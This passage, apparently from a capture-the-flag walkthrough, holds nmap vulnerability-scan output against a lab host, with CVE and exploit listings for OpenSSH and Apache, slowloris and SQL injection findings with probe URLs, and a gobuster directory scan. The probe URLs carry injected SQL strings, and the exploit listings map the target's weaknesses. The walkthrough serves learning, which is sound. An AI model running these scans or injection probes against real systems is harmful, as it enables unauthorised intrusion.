|     	EXPLOITPACK:1902C998CBF9154396911926B4C3B330	5.5	https://vulners.com/exploitpack/EXPLOITPACK:1902C998CBF9154396911926B4C3B330	*EXPLOIT*
|     	EDB-ID:40858	5.5	https://vulners.com/exploitdb/EDB-ID:40858	*EXPLOIT*
|     	EDB-ID:40119	5.5	https://vulners.com/exploitdb/EDB-ID:40119	*EXPLOIT*
|     	EDB-ID:39569	5.5	https://vulners.com/exploitdb/EDB-ID:39569	*EXPLOIT*
|     	CVE-2016-3115	5.5	https://vulners.com/cve/CVE-2016-3115
|     	SSH_ENUM	5.0	https://vulners.com/canvas/SSH_ENUM	*EXPLOIT*
|     	PACKETSTORM:150621	5.0	https://vulners.com/packetstorm/PACKETSTORM:150621	*EXPLOIT*
|     	MSF:AUXILIARY/SCANNER/SSH/SSH_ENUMUSERS	5.0	https://vulners.com/metasploit/MSF:AUXILIARY/SCANNER/SSH/SSH_ENUMUSERS	*EXPLOIT*
|     	EXPLOITPACK:F957D7E8A0CC1E23C3C649B764E13FB0	5.0	https://vulners.com/exploitpack/EXPLOITPACK:F957D7E8A0CC1E23C3C649B764E13FB0	*EXPLOIT*
|     	EXPLOITPACK:EBDBC5685E3276D648B4D14B75563283	5.0	https://vulners.com/exploitpack/EXPLOITPACK:EBDBC5685E3276D648B4D14B75563283	*EXPLOIT*
|     	EDB-ID:45939	5.0	https://vulners.com/exploitdb/EDB-ID:45939	*EXPLOIT*
|     	EDB-ID:45233	5.0	https://vulners.com/exploitdb/EDB-ID:45233	*EXPLOIT*
|     	CVE-2018-15919	5.0	https://vulners.com/cve/CVE-2018-15919
|     	CVE-2018-15473	5.0	https://vulners.com/cve/CVE-2018-15473
|     	CVE-2017-15906	5.0	https://vulners.com/cve/CVE-2017-15906
|     	CVE-2016-10708	5.0	https://vulners.com/cve/CVE-2016-10708
|     	1337DAY-ID-31730	5.0	https://vulners.com/zdt/1337DAY-ID-31730	*EXPLOIT*
|     	CVE-2021-41617	4.4	https://vulners.com/cve/CVE-2021-41617
|     	MSF:ILITIES/OPENBSD-OPENSSH-CVE-2020-14145/	4.3	https://vulners.com/metasploit/MSF:ILITIES/OPENBSD-OPENSSH-CVE-2020-14145/	*EXPLOIT*
|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP9-CVE-2020-14145/	4.3	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP9-CVE-2020-14145/	*EXPLOIT*
|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2020-14145/	4.3	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2020-14145/	*EXPLOIT*
|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP5-CVE-2020-14145/	4.3	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP5-CVE-2020-14145/	*EXPLOIT*
|     	MSF:ILITIES/F5-BIG-IP-CVE-2020-14145/	4.3	https://vulners.com/metasploit/MSF:ILITIES/F5-BIG-IP-CVE-2020-14145/	*EXPLOIT*
|     	EXPLOITPACK:802AF3229492E147A5F09C7F2B27C6DF	4.3	https://vulners.com/exploitpack/EXPLOITPACK:802AF3229492E147A5F09C7F2B27C6DF	*EXPLOIT*
|     	EXPLOITPACK:5652DDAA7FE452E19AC0DC1CD97BA3EF	4.3	https://vulners.com/exploitpack/EXPLOITPACK:5652DDAA7FE452E19AC0DC1CD97BA3EF	*EXPLOIT*
|     	EDB-ID:40136	4.3	https://vulners.com/exploitdb/EDB-ID:40136	*EXPLOIT*
|     	EDB-ID:40113	4.3	https://vulners.com/exploitdb/EDB-ID:40113	*EXPLOIT*
|     	CVE-2020-14145	4.3	https://vulners.com/cve/CVE-2020-14145
|     	CVE-2016-6210	4.3	https://vulners.com/cve/CVE-2016-6210
|     	1337DAY-ID-25440	4.3	https://vulners.com/zdt/1337DAY-ID-25440	*EXPLOIT*
|     	1337DAY-ID-25438	4.3	https://vulners.com/zdt/1337DAY-ID-25438	*EXPLOIT*
|     	CVE-2019-6110	4.0	https://vulners.com/cve/CVE-2019-6110
|     	CVE-2019-6109	4.0	https://vulners.com/cve/CVE-2019-6109
|     	CVE-2018-20685	2.6	https://vulners.com/cve/CVE-2018-20685
|     	SSV:92581	2.1	https://vulners.com/seebug/SSV:92581	*EXPLOIT*
|     	CVE-2016-10011	2.1	https://vulners.com/cve/CVE-2016-10011
|     	SRC-2016-0002	0.0	https://vulners.com/srcincite/SRC-2016-0002	*EXPLOIT*
|     	PACKETSTORM:151227	0.0	https://vulners.com/packetstorm/PACKETSTORM:151227	*EXPLOIT*
|     	PACKETSTORM:140261	0.0	https://vulners.com/packetstorm/PACKETSTORM:140261	*EXPLOIT*
|     	PACKETSTORM:138006	0.0	https://vulners.com/packetstorm/PACKETSTORM:138006	*EXPLOIT*
|     	PACKETSTORM:137942	0.0	https://vulners.com/packetstorm/PACKETSTORM:137942	*EXPLOIT*
|_    	1337DAY-ID-30937	0.0	https://vulners.com/zdt/1337DAY-ID-30937	*EXPLOIT*
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server&#039;s resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       http://ha.ckers.org/slowloris/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_http-csrf: Couldn&#039;t find any CSRF vulnerabilities.
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-dombased-xss: Couldn&#039;t find any DOM based XSS.
| http-fileupload-exploiter: 
|   
|     Couldn&#039;t find a file-type field.
|   
|_    Couldn&#039;t find a file-type field.
|_http-stored-xss: Couldn&#039;t find any stored XSS vulnerabilities.
| http-sql-injection: 
|   Possible sqli for queries:
|     http://10.10.105.134:80/item.php?id=1%27%20OR%20sqlspider
|     http://10.10.105.134:80/item.php?id=2%27%20OR%20sqlspider
|     http://10.10.105.134:80/item.php?id=3%27%20OR%20sqlspider
|     http://10.10.105.134:80/assets/?C=S%3BO%3DA%27%20OR%20sqlspider
|     http://10.10.105.134:80/assets/?C=M%3BO%3DA%27%20OR%20sqlspider
|     http://10.10.105.134:80/assets/?C=D%3BO%3DA%27%20OR%20sqlspider
|     http://10.10.105.134:80/assets/?C=N%3BO%3DD%27%20OR%20sqlspider
|     http://10.10.105.134:80/assets/?C=M%3BO%3DA%27%20OR%20sqlspider
|     http://10.10.105.134:80/assets/?C=D%3BO%3DA%27%20OR%20sqlspider
|     http://10.10.105.134:80/assets/?C=S%3BO%3DD%27%20OR%20sqlspider
|     http://10.10.105.134:80/assets/?C=N%3BO%3DA%27%20OR%20sqlspider
|     http://10.10.105.134:80/assets/?C=M%3BO%3DD%27%20OR%20sqlspider
|     http://10.10.105.134:80/assets/?C=S%3BO%3DA%27%20OR%20sqlspider
|     http://10.10.105.134:80/assets/?C=D%3BO%3DA%27%20OR%20sqlspider
|     http://10.10.105.134:80/assets/?C=N%3BO%3DA%27%20OR%20sqlspider
|     http://10.10.105.134:80/assets/?C=D%3BO%3DD%27%20OR%20sqlspider
|     http://10.10.105.134:80/assets/?C=S%3BO%3DA%27%20OR%20sqlspider
|     http://10.10.105.134:80/assets/?C=M%3BO%3DA%27%20OR%20sqlspider
|     http://10.10.105.134:80/assets/?C=N%3BO%3DA%27%20OR%20sqlspider
|     http://10.10.105.134:80/assets/?C=D%3BO%3DA%27%20OR%20sqlspider
|     http://10.10.105.134:80/assets/?C=S%3BO%3DA%27%20OR%20sqlspider
|     http://10.10.105.134:80/assets/?C=M%3BO%3DA%27%20OR%20sqlspider
|     http://10.10.105.134:80/assets/?C=N%3BO%3DA%27%20OR%20sqlspider
|     http://10.10.105.134:80/assets/?C=D%3BO%3DA%27%20OR%20sqlspider
|     http://10.10.105.134:80/assets/?C=S%3BO%3DA%27%20OR%20sqlspider
|     http://10.10.105.134:80/assets/?C=M%3BO%3DA%27%20OR%20sqlspider
|     http://10.10.105.134:80/assets/?C=N%3BO%3DA%27%20OR%20sqlspider
|     http://10.10.105.134:80/assets/?C=S%3BO%3DA%27%20OR%20sqlspider
|     http://10.10.105.134:80/assets/?C=M%3BO%3DA%27%20OR%20sqlspider
|     http://10.10.105.134:80/assets/?C=D%3BO%3DA%27%20OR%20sqlspider
|     http://10.10.105.134:80/assets/?C=N%3BO%3DD%27%20OR%20sqlspider
|     http://10.10.105.134:80/assets/?C=D%3BO%3DA%27%20OR%20sqlspider
|     http://10.10.105.134:80/assets/?C=S%3BO%3DA%27%20OR%20sqlspider
|     http://10.10.105.134:80/assets/?C=M%3BO%3DA%27%20OR%20sqlspider
|     http://10.10.105.134:80/assets/?C=N%3BO%3DA%27%20OR%20sqlspider
|     http://10.10.105.134:80/assets/?C=D%3BO%3DA%27%20OR%20sqlspider
|     http://10.10.105.134:80/assets/?C=S%3BO%3DA%27%20OR%20sqlspider
|     http://10.10.105.134:80/assets/?C=M%3BO%3DA%27%20OR%20sqlspider
|_    http://10.10.105.134:80/assets/?C=N%3BO%3DA%27%20OR%20sqlspider
| vulners: 
|   cpe:/a:apache:http_server:2.4.18: 
|     	CVE-2021-44790	7.5	https://vulners.com/cve/CVE-2021-44790
|     	CVE-2021-39275	7.5	https://vulners.com/cve/CVE-2021-39275
|     	CVE-2021-26691	7.5	https://vulners.com/cve/CVE-2021-26691
|     	CVE-2017-7679	7.5	https://vulners.com/cve/CVE-2017-7679
|     	CVE-2017-7668	7.5	https://vulners.com/cve/CVE-2017-7668
|     	CVE-2017-3169	7.5	https://vulners.com/cve/CVE-2017-3169
|     	CVE-2017-3167	7.5	https://vulners.com/cve/CVE-2017-3167
|     	MSF:ILITIES/REDHAT_LINUX-CVE-2019-0211/	7.2	https://vulners.com/metasploit/MSF:ILITIES/REDHAT_LINUX-CVE-2019-0211/	*EXPLOIT*
|     	MSF:ILITIES/IBM-HTTP_SERVER-CVE-2019-0211/	7.2	https://vulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE-2019-0211/	*EXPLOIT*
|     	EXPLOITPACK:44C5118F831D55FAF4259C41D8BDA0AB	7.2	https://vulners.com/exploitpack/EXPLOITPACK:44C5118F831D55FAF4259C41D8BDA0AB	*EXPLOIT*
|     	EDB-ID:46676	7.2	https://vulners.com/exploitdb/EDB-ID:46676	*EXPLOIT*
|     	CVE-2019-0211	7.2	https://vulners.com/cve/CVE-2019-0211
|     	1337DAY-ID-32502	7.2	https://vulners.com/zdt/1337DAY-ID-32502	*EXPLOIT*
|     	MSF:ILITIES/UBUNTU-CVE-2018-1312/	6.8	https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1312/	*EXPLOIT*
|     	MSF:ILITIES/UBUNTU-CVE-2017-15715/	6.8	https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2017-15715/	*EXPLOIT*
|     	MSF:ILITIES/SUSE-CVE-2017-15715/	6.8	https://vulners.com/metasploit/MSF:ILITIES/SUSE-CVE-2017-15715/	*EXPLOIT*
|     	MSF:ILITIES/REDHAT_LINUX-CVE-2017-15715/	6.8	https://vulners.com/metasploit/MSF:ILITIES/REDHAT_LINUX-CVE-2017-15715/	*EXPLOIT*
|     	MSF:ILITIES/ORACLE_LINUX-CVE-2017-15715/	6.8	https://vulners.com/metasploit/MSF:ILITIES/ORACLE_LINUX-CVE-2017-15715/	*EXPLOIT*
|     	MSF:ILITIES/ORACLE-SOLARIS-CVE-2017-15715/	6.8	https://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-2017-15715/	*EXPLOIT*
|     	MSF:ILITIES/IBM-HTTP_SERVER-CVE-2017-15715/	6.8	https://vulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE-2017-15715/	*EXPLOIT*
|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2018-1312/	6.8	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2018-1312/	*EXPLOIT*
|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2017-15715/	6.8	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2017-15715/	*EXPLOIT*
|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2018-1312/	6.8	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2018-1312/	*EXPLOIT*
|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2017-15715/	6.8	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2017-15715/	*EXPLOIT*
|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP1-CVE-2018-1312/	6.8	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP1-CVE-2018-1312/	*EXPLOIT*
|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP1-CVE-2017-15715/	6.8	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP1-CVE-2017-15715/	*EXPLOIT*
|     	MSF:ILITIES/FREEBSD-CVE-2017-15715/	6.8	https://vulners.com/metasploit/MSF:ILITIES/FREEBSD-CVE-2017-15715/	*EXPLOIT*
|     	MSF:ILITIES/DEBIAN-CVE-2017-15715/	6.8	https://vulners.com/metasploit/MSF:ILITIES/DEBIAN-CVE-2017-15715/	*EXPLOIT*
|     	MSF:ILITIES/CENTOS_LINUX-CVE-2017-15715/	6.8	https://vulners.com/metasploit/MSF:ILITIES/CENTOS_LINUX-CVE-2017-15715/	*EXPLOIT*
|     	MSF:ILITIES/APACHE-HTTPD-CVE-2017-15715/	6.8	https://vulners.com/metasploit/MSF:ILITIES/APACHE-HTTPD-CVE-2017-15715/	*EXPLOIT*
|     	MSF:ILITIES/AMAZON_LINUX-CVE-2017-15715/	6.8	https://vulners.com/metasploit/MSF:ILITIES/AMAZON_LINUX-CVE-2017-15715/	*EXPLOIT*
|     	MSF:ILITIES/ALPINE-LINUX-CVE-2018-1312/	6.8	https://vulners.com/metasploit/MSF:ILITIES/ALPINE-LINUX-CVE-2018-1312/	*EXPLOIT*
|     	MSF:ILITIES/ALPINE-LINUX-CVE-2017-15715/	6.8	https://vulners.com/metasploit/MSF:ILITIES/ALPINE-LINUX-CVE-2017-15715/	*EXPLOIT*
|     	FDF3DFA1-ED74-5EE2-BF5C-BA752CA34AE8	6.8	https://vulners.com/githubexploit/FDF3DFA1-ED74-5EE2-BF5C-BA752CA34AE8	*EXPLOIT*
|     	CVE-2021-40438	6.8	https://vulners.com/cve/CVE-2021-40438
|     	CVE-2020-35452	6.8	https://vulners.com/cve/CVE-2020-35452
|     	CVE-2018-1312	6.8	https://vulners.com/cve/CVE-2018-1312
|     	CVE-2017-15715	6.8	https://vulners.com/cve/CVE-2017-15715
|     	4810E2D9-AC5F-5B08-BFB3-DDAFA2F63332	6.8	https://vulners.com/githubexploit/4810E2D9-AC5F-5B08-BFB3-DDAFA2F63332	*EXPLOIT*
|     	CVE-2021-44224	6.4	https://vulners.com/cve/CVE-2021-44224
|     	CVE-2019-10082	6.4	https://vulners.com/cve/CVE-2019-10082
|     	CVE-2017-9788	6.4	https://vulners.com/cve/CVE-2017-9788
|     	MSF:ILITIES/REDHAT_LINUX-CVE-2019-0217/	6.0	https://vulners.com/metasploit/MSF:ILITIES/REDHAT_LINUX-CVE-2019-0217/	*EXPLOIT*
|     	MSF:ILITIES/IBM-HTTP_SERVER-CVE-2019-0217/	6.0	https://vulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE-2019-0217/	*EXPLOIT*
|     	CVE-2019-0217	6.0	https://vulners.com/cve/CVE-2019-0217
|     	CVE-2020-1927	5.8	https://vulners.com/cve/CVE-2020-1927
|     	CVE-2019-10098	5.8	https://vulners.com/cve/CVE-2019-10098
|     	1337DAY-ID-33577	5.8	https://vulners.com/zdt/1337DAY-ID-33577	*EXPLOIT*
|     	CVE-2016-5387	5.1	https://vulners.com/cve/CVE-2016-5387
|     	SSV:96537	5.0	https://vulners.com/seebug/SSV:96537	*EXPLOIT*
|     	MSF:ILITIES/UBUNTU-CVE-2018-1333/	5.0	https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1333/	*EXPLOIT*
|     	MSF:ILITIES/UBUNTU-CVE-2018-1303/	5.0	https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1303/	*EXPLOIT*
|     	MSF:ILITIES/UBUNTU-CVE-2017-15710/	5.0	https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2017-15710/	*EXPLOIT*
|     	MSF:ILITIES/ORACLE-SOLARIS-CVE-2020-1934/	5.0	https://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-2020-1934/	*EXPLOIT*
|     	MSF:ILITIES/ORACLE-SOLARIS-CVE-2017-15710/	5.0	https://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-2017-15710/	*EXPLOIT*
|     	MSF:ILITIES/IBM-HTTP_SERVER-CVE-2017-15710/	5.0	https://vulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE-2017-15710/	*EXPLOIT*
|     	MSF:ILITIES/IBM-HTTP_SERVER-CVE-2016-8743/	5.0	https://vulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE-2016-8743/	*EXPLOIT*
|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2017-15710/	5.0	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2017-15710/	*EXPLOIT*
|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2017-15710/	5.0	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2017-15710/	*EXPLOIT*
|     	MSF:ILITIES/CENTOS_LINUX-CVE-2017-15710/	5.0	https://vulners.com/metasploit/MSF:ILITIES/CENTOS_LINUX-CVE-2017-15710/	*EXPLOIT*
|     	MSF:AUXILIARY/SCANNER/HTTP/APACHE_OPTIONSBLEED	5.0	https://vulners.com/metasploit/MSF:AUXILIARY/SCANNER/HTTP/APACHE_OPTIONSBLEED	*EXPLOIT*
|     	EXPLOITPACK:C8C256BE0BFF5FE1C0405CB0AA9C075D	5.0	https://vulners.com/exploitpack/EXPLOITPACK:C8C256BE0BFF5FE1C0405CB0AA9C075D	*EXPLOIT*
|     	EXPLOITPACK:2666FB0676B4B582D689921651A30355	5.0	https://vulners.com/exploitpack/EXPLOITPACK:2666FB0676B4B582D689921651A30355	*EXPLOIT*
|     	EDB-ID:42745	5.0	https://vulners.com/exploitdb/EDB-ID:42745	*EXPLOIT*
|     	EDB-ID:40909	5.0	https://vulners.com/exploitdb/EDB-ID:40909	*EXPLOIT*
|     	CVE-2021-34798	5.0	https://vulners.com/cve/CVE-2021-34798
|     	CVE-2021-33193	5.0	https://vulners.com/cve/CVE-2021-33193
|     	CVE-2021-26690	5.0	https://vulners.com/cve/CVE-2021-26690
|     	CVE-2020-1934	5.0	https://vulners.com/cve/CVE-2020-1934
|     	CVE-2019-17567	5.0	https://vulners.com/cve/CVE-2019-17567
|     	CVE-2019-0220	5.0	https://vulners.com/cve/CVE-2019-0220
|     	CVE-2019-0196	5.0	https://vulners.com/cve/CVE-2019-0196
|     	CVE-2018-17199	5.0	https://vulners.com/cve/CVE-2018-17199
|     	CVE-2018-17189	5.0	https://vulners.com/cve/CVE-2018-17189
|     	CVE-2018-1333	5.0	https://vulners.com/cve/CVE-2018-1333
|     	CVE-2018-1303	5.0	https://vulners.com/cve/CVE-2018-1303
|     	CVE-2017-9798	5.0	https://vulners.com/cve/CVE-2017-9798
|     	CVE-2017-15710	5.0	https://vulners.com/cve/CVE-2017-15710
|     	CVE-2016-8743	5.0	https://vulners.com/cve/CVE-2016-8743
|     	CVE-2016-8740	5.0	https://vulners.com/cve/CVE-2016-8740
|     	CVE-2016-4979	5.0	https://vulners.com/cve/CVE-2016-4979
|     	1337DAY-ID-28573	5.0	https://vulners.com/zdt/1337DAY-ID-28573	*EXPLOIT*
|     	MSF:ILITIES/ORACLE-SOLARIS-CVE-2019-0197/	4.9	https://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-2019-0197/	*EXPLOIT*
|     	CVE-2019-0197	4.9	https://vulners.com/cve/CVE-2019-0197
|     	MSF:ILITIES/UBUNTU-CVE-2018-1302/	4.3	https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1302/	*EXPLOIT*
|     	MSF:ILITIES/UBUNTU-CVE-2018-1301/	4.3	https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1301/	*EXPLOIT*
|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2016-4975/	4.3	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2016-4975/	*EXPLOIT*
|     	MSF:ILITIES/DEBIAN-CVE-2019-10092/	4.3	https://vulners.com/metasploit/MSF:ILITIES/DEBIAN-CVE-2019-10092/	*EXPLOIT*
|     	MSF:ILITIES/APACHE-HTTPD-CVE-2020-11985/	4.3	https://vulners.com/metasploit/MSF:ILITIES/APACHE-HTTPD-CVE-2020-11985/	*EXPLOIT*
|     	MSF:ILITIES/APACHE-HTTPD-CVE-2019-10092/	4.3	https://vulners.com/metasploit/MSF:ILITIES/APACHE-HTTPD-CVE-2019-10092/	*EXPLOIT*
|     	CVE-2020-11985	4.3	https://vulners.com/cve/CVE-2020-11985
|     	CVE-2019-10092	4.3	https://vulners.com/cve/CVE-2019-10092
|     	CVE-2018-1302	4.3	https://vulners.com/cve/CVE-2018-1302
|     	CVE-2018-1301	4.3	https://vulners.com/cve/CVE-2018-1301
|     	CVE-2018-11763	4.3	https://vulners.com/cve/CVE-2018-11763
|     	CVE-2016-4975	4.3	https://vulners.com/cve/CVE-2016-4975
|     	CVE-2016-1546	4.3	https://vulners.com/cve/CVE-2016-1546
|     	4013EC74-B3C1-5D95-938A-54197A58586D	4.3	https://vulners.com/githubexploit/4013EC74-B3C1-5D95-938A-54197A58586D	*EXPLOIT*
|     	1337DAY-ID-33575	4.3	https://vulners.com/zdt/1337DAY-ID-33575	*EXPLOIT*
|     	MSF:ILITIES/UBUNTU-CVE-2018-1283/	3.5	https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1283/	*EXPLOIT*
|     	MSF:ILITIES/REDHAT_LINUX-CVE-2018-1283/	3.5	https://vulners.com/metasploit/MSF:ILITIES/REDHAT_LINUX-CVE-2018-1283/	*EXPLOIT*
|     	MSF:ILITIES/ORACLE-SOLARIS-CVE-2018-1283/	3.5	https://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-2018-1283/	*EXPLOIT*
|     	MSF:ILITIES/IBM-HTTP_SERVER-CVE-2018-1283/	3.5	https://vulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE-2018-1283/	*EXPLOIT*
|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2018-1283/	3.5	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2018-1283/	*EXPLOIT*
|     	MSF:ILITIES/CENTOS_LINUX-CVE-2018-1283/	3.5	https://vulners.com/metasploit/MSF:ILITIES/CENTOS_LINUX-CVE-2018-1283/	*EXPLOIT*
|     	CVE-2018-1283	3.5	https://vulners.com/cve/CVE-2018-1283
|     	CVE-2016-8612	3.3	https://vulners.com/cve/CVE-2016-8612
|     	PACKETSTORM:152441	0.0	https://vulners.com/packetstorm/PACKETSTORM:152441	*EXPLOIT*
|_    	MSF:EXPLOIT/UNIX/WEBAPP/JOOMLA_MEDIA_UPLOAD_EXEC/	0.0	https://vulners.com/metasploit/MSF:EXPLOIT/UNIX/WEBAPP/JOOMLA_MEDIA_UPLOAD_EXEC/	*EXPLOIT*
| http-enum: 
|_  /robots.txt: Robots file
|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=2/2%OT=22%CT=1%CU=42651%PV=Y%DS=4%DC=T%G=Y%TM=61FB4F78
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=108%GCD=1%ISR=109%TI=Z%CI=I%II=I%TS=8)OPS(
OS:O1=M506ST11NW7%O2=M506ST11NW7%O3=M506NNT11NW7%O4=M506ST11NW7%O5=M506ST11
OS:NW7%O6=M506ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(
OS:R=Y%DF=Y%T=40%W=6903%O=M506NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T
OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=
OS:S)

Uptime guess: 0.010 days (since Wed Feb  2 20:30:09 2022)
Network Distance: 4 hops
TCP Sequence Prediction: Difficulty=264 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 21/tcp)
HOP RTT       ADDRESS
1   35.71 ms  10.13.0.1
2   ... 3
4   170.37 ms 10.10.105.134

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Feb  2 20:43:52 2022 -- 1 IP address (1 host up) scanned in 915.75 seconds
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;a href=&quot;https://cardboard-iguana.com/grimoire/spellbook/ssh&quot; class=&quot;internal alias&quot; data-slug=&quot;spellbook/ssh&quot;&gt;SSH&lt;/a&gt; and Apache on port 80. Pretty standard. There is an enumerated /robots.txt file, which turns out to be invalid — it contains only the phrase “Wubbalubbadubdub”.&lt;/p&gt;
&lt;p&gt;Let’s also hit the target with &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/gobuster&quot; class=&quot;internal&quot; data-slug=&quot;spells/gobuster&quot;&gt;gobuster&lt;/a&gt;:&lt;/p&gt;
&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-light&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-light&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#59873A&quot;&gt;gobuster&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; \&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt;	-t&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#2F798A&quot;&gt; 50&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt; dir&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; \&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt;	-u&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt; http://10.10.105.134&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; \&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt;	-w&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt; /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
&lt;p&gt;This reveals some interesting directories:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;/assets is unsecured and contains site assets, and reveals that we’re running Apache 2.4.18 on Ubuntu.&lt;/li&gt;
&lt;li&gt;/delete is a plain text file: “New priv esc for Ubuntu?? Change &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/mysql&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/mysql&quot;&gt;MySQL&lt;/a&gt; password on main system!”&lt;/li&gt;
&lt;li&gt;/server-status is forbidden (which is not surprising).&lt;/li&gt;
&lt;/ul&gt;
